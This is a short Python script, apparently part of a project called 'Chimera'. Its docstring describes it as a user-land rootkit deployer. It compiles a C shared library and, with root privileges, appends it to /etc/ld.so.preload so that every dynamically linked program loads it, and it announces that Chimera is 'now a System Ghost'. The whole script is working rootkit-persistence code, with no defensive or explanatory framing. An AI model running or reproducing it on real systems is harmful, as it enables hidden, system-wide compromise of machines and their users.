#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess

class LibraryHijacker:
    """
    Agent 426: User-land Rootkit Deployment.
    Compiles the shared library and injects it into the 
    global dynamic linker preload configuration.
    """
    def execute(self):
        print("--- [AGENT 426: LIBRARY HIJACK SEQUENCE] ---")
        src = "/home/dan/Chimera_Project/agents/426_Library_Hijacker/src/hijack.c"
        lib_out = "/home/dan/Chimera_Project/agents/426_Library_Hijacker/src/hijack.so"
        
        # 1. Compile as a Shared Library (-fPIC -shared)
        subprocess.run(["gcc", "-fPIC", "-shared", src, "-o", lib_out, "-ldl"], check=True)
        
        if os.getuid() != 0:
            print("[!] Critical: Writing to /etc/ld.so.preload requires Root.")
            return

        # 2. Inject into the global preload file
        try:
            with open("/etc/ld.so.preload", "a") as f:
                f.write(lib_out + "\n")
            print(f"[\033[92mSUCCESS\033[0m] Library injected. Chimera is now a System Ghost.")
        except Exception as e:
            print(f"[!] Injection failed: {e}")

if __name__ == "__main__":
    LibraryHijacker().execute()
